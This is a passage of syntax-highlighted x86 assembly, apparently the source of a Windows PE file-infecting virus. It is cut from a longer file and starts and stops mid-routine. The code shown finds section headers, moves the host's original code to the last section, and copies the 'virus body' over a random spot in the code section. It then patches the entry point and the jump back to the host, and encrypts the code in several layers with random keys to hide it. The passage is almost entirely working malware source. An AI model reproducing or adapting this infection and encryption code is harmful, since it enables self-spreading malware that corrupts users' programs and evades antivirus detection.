</span><span class="sc5">found_it</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;нfound!</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;нlet's locate the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofsections</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нlast section's header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstsection</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofcode</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нget a random offset from</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">;нthe start to put the</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;нcode there...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нgo to code section's</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нraw data</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;нsave the address</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нgo to the last section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нat it's end...</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н...and save that</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нnormalize...</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">              </span><span class="sc1">;нbytes to transfer</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;нmove the code...</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нand also fill in the</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нaddress for the reloc.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;нcode</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@10</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;нand for the decryptor</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jumper</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;нsave this value</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нfill more...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">eip</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нfill the jump</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@9</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">relocating_code</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нnow move also the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">relo_code_size</span><span class="sc0">             </span><span class="sc1">;нrelocating code</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нnow let's encrypt the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нoriginal code plus the</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нrelocating code which</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нare now at the end of</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">             </span><span class="sc1">;нthe last section. The</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;нencryption is multi-</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;нiterative with sliding</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">             </span><span class="sc1">;нkey, fixed key, fixed</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;нoperation. Max 100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">increment</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;нiterations multiplied</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                </span><span class="sc1">;нby around 500h gives</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;нthe total number of</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                </span><span class="sc1">;нloops.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iterations</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нget key</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">increment</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нget key increment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;нsize of code</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iterations</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нnumber of iterations</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;нsave edi</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;нget dword</span><span class="sc0">
       </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                  </span><span class="sc1">;нand store</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;нgo to next dword</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt_loop</span><span class="sc0">               </span><span class="sc1">;нloop until end</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;нdecrement iterations</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ready_</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;нredo all...</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">encrypt_loop</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">ready_</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нand now move the virus</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нbody over the original</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нcode section.</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нstore the new EIP</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">neweip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@12</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;нand fill in the image</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;нbase getter</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@12</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нnow fill the jump</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нto the host</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@11</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jumper</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нnow do the level 2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                   </span><span class="sc1">;нencryption</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">encrypt_iteration</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'DEAD'</span><span class="sc4">+</span><span class="sc12">'MEAT'</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesection</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">decrypt_level_2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randomincr</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">end</span><span class="sc4">-</span><span class="sc5">decrypt_level_2</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">encrypt_routine</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
